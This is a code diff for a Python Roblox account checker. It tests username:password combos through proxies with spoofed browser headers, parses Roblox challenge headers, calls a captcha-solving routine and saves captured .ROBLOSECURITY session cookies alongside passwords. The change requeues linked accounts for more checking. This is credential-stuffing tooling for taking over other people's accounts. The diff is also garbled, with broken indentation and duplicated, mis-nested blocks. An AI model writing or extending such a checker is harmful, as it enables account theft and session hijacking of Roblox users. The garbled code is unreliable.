@@ -118,7 +118,7 @@ class Roblox:
                         self.checked = True
                         self.attempts = 0
                         continue
-                        
+
                 Output("INFO").log(f"Checking account | {self.account[0]}")
 
                 self.session, self.sec_ch_ua, self.user_agent, self.proxy = Session().session()
@@ -206,12 +206,11 @@ class Roblox:
                 if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
                     Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
-                    self.handle_multi(user_id_and_cookie)
+                    self.handle_multi(response.json())
 
                     self.checked = True
-                    continue
 
-                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
+                elif response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                     user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
 
                     self.account[0] = response.json()["user"]["name"]
@@ -230,19 +229,27 @@ class Roblox:
 
                 else:
                     raise ValueError("invalid")
-                
-                challenge_type = response.headers.get("rblx-challenge-type")
+                if not self.checked:
+                    challenge_type = response.headers.get("rblx-challenge-type")
+
+                if challenge_type == "denied":
+                        raise ValueError("Challenge type denied")
+
+                    challenge_id = response.headers.get("rblx-challenge-id")
+                    metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
+                    blob = metadata.get("dataExchangeBlob")
+                    captcha_id = metadata.get("unifiedCaptchaId")
+
+                if cookie_header.endswith("; "):
+                        cookie_header = cookie_header[:-2]
 
                 if challenge_type == "denied":
                     raise ValueError("Challenge type denied")
 
-                challenge_id = response.headers.get("rblx-challenge-id")
-                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
-                blob = metadata.get("dataExchangeBlob")
-                captcha_id = metadata.get("unifiedCaptchaId")
+                if challenge_type == "rostile":
+                    Output("CAPTCHA").log("Rostile detected")
 
-                if cookie_header.endswith("; "):
-                    cookie_header = cookie_header[:-2]
+                    payload = Rostile.get_solution(challenge_id)
 
                 if challenge_type == "rostile":
                     Output("CAPTCHA").log("Rostile detected")
@@ -433,11 +440,11 @@ class Roblox:
 
                 Output("SUCCESS").log(f"Valid account | {self.account[0]}")
 
-                cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"
+                   cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"
 
-                self.handle_valid(user_id_and_cookie, cookie_header)
+                   self.handle_valid(user_id_and_cookie, cookie_header)
 
-                self.checked = True
+                   self.checked = True
 
             except Exception as e:
                 if str(e) == "invalid":
@@ -531,16 +538,14 @@ class Roblox:
                     file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
 
     def handle_multi(self, user_id_and_cookie) -> None:
-        multiple_accounts_list = []
 
         multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]
 
         for multiple_account in multiple_accounts:
-            multiple_accounts_list.append(f'{multiple_account.get("name")}:{self.account[1]}\n')
 
-        with self.lock.get_lock():
-            with open("output/multiple_linked.txt", "a", encoding="utf-8") as file:
-                file.writelines(multiple_accounts_list)
+            combo = f"{multiple_account.get('name')}:{self.account[1]}\n"
+            self.accounts.insert(self.counter.get_value() + 1, combo)
+
 
         if WEBHOOK_ENABLED:
             try:
